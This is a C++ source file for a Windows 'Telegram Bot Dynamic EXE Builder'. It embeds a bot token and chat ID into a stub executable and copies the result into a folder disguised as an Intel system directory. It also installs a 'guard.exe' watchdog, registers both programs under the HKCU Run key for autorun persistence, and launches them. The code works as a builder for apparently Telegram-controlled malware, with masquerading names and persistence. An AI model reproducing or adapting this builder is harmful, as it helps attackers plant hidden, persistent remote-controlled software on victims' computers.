#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <random>
#include <filesystem>
#include <windows.h>

namespace fs = std::filesystem;

const std::string CONFIG_MARKER = "---CONFIG_START---";

static std::string GenerateRandomExeName(size_t length = 8) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<size_t> dist(0, chars.size() - 1);

    std::string name = "app_";
    for (size_t i = 0; i < length; ++i) {
        name += chars[dist(gen)];
    }
    return name + ".exe";
}

static bool AddStartupEntry(const std::string& valueName, const std::string& commandLine) {
    HKEY hKey = NULL;
    LONG res = RegOpenKeyExA(
        HKEY_CURRENT_USER,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0,
        KEY_SET_VALUE,
        &hKey
    );
    if (res != ERROR_SUCCESS) return false;

    res = RegSetValueExA(
        hKey,
        valueName.c_str(),
        0,
        REG_SZ,
        reinterpret_cast<const BYTE*>(commandLine.c_str()),
        static_cast<DWORD>(commandLine.size() + 1)
    );

    RegCloseKey(hKey);
    return (res == ERROR_SUCCESS);
}

static bool RunProcess(const std::string& exePath, const std::string& workDir, const std::string& cmdLine) {
    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    std::vector<char> buf(cmdLine.begin(), cmdLine.end());
    buf.push_back('\0');

    if (!CreateProcessA(
            exePath.c_str(),
            buf.data(),
            NULL,
            NULL,
            FALSE,
            0,
            NULL,
            workDir.empty() ? NULL : workDir.c_str(),
            &si,
            &pi)) {
        return false;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}

int main() {
    std::string token, chat_id, output_name;

    std::cout << "========================================\n";
    std::cout << "  Telegram Bot Dynamic EXE Builder      \n";
    std::cout << "========================================\n\n";

    std::cout << "[?] Enter Bot Token: ";
    std::getline(std::cin, token);

    std::cout << "[?] Enter Chat ID: ";
    std::getline(std::cin, chat_id);

    std::cout << "[?] Enter Output EXE Name (leave blank for random): ";
    std::getline(std::cin, output_name);

    if (output_name.empty()) {
        output_name = GenerateRandomExeName(8);
    } else if (output_name.size() < 4 || _stricmp(output_name.c_str() + output_name.size() - 4, ".exe") != 0) {
        output_name += ".exe";
    }

    std::ifstream stubFile("stub.exe", std::ios::binary);
    if (!stubFile) {
        std::cout << "\n[-] Error: 'stub.exe' not found in the current folder!\n";
        system("pause");
        return 1;
    }

    std::ofstream outFile(output_name, std::ios::binary);
    outFile << stubFile.rdbuf();
    stubFile.close();

    std::string configPayload = CONFIG_MARKER + token + "|" + chat_id;
    outFile.write(configPayload.c_str(), configPayload.length());
    outFile.close();

    std::cout << "\n[+] Generated EXE: " << output_name << "\n";

    // Path များ မပြောင်းဘဲ ထားရှိခြင်း
    std::string destFolder = "C:\\Program Files\\IntelSystemapp";
    std::error_code ec;
    fs::create_directories(destFolder, ec);

    std::string finalBotPath = (fs::path(destFolder) / output_name).string();
    bool botCopied = CopyFileA(output_name.c_str(), finalBotPath.c_str(), FALSE) != FALSE;
    if (botCopied) {
        std::cout << "[+] Sent bot to: " << finalBotPath << "\n";
    } else {
        std::cout << "[-] Failed to copy bot to: " << finalBotPath << "\n";
    }

    const std::string guardSource = "guard.exe";
    const std::string system32Guard = "C:\\Program Files\\Guard\\guard.exe";
    bool guardCopied = false;
    if (fs::exists(guardSource)) {
        fs::create_directories(fs::path(system32Guard).parent_path(), ec);
        guardCopied = CopyFileA(guardSource.c_str(), system32Guard.c_str(), FALSE) != FALSE;
        if (guardCopied) {
            std::cout << "[+] Sent guard.exe to: " << system32Guard << "\n";
        } else {
            std::cout << "[-] Failed to copy guard.exe (Run as Administrator!)\n";
        }
    }

    std::string botCmd   = "\"" + finalBotPath + "\"";
    std::string guardCmd = "\"" + system32Guard + "\" \"" + finalBotPath + "\"";

    AddStartupEntry(output_name + "_App", botCmd);
    AddStartupEntry("SystemGuard_App", guardCmd);
    std::cout << "[+] Autorun configured for target: " << finalBotPath << "\n";

    // Build ပြီးတာနဲ့ ချက်ချင်း Auto Open လုပ်ခြင်း
    if (botCopied) {
        if (RunProcess(finalBotPath, destFolder, botCmd)) {
            std::cout << "[+] Launched bot: " << finalBotPath << "\n";
        } else {
            std::cout << "[-] Failed to launch bot.\n";
        }
    }

    if (guardCopied) {
        if (RunProcess(system32Guard, "", guardCmd)) {
            std::cout << "[+] Launched guard: " << system32Guard << "\n";
        } else {
            std::cout << "[-] Failed to launch guard.\n";
        }
    }

    std::cout << "\n";
    system("pause");
    return 0;
}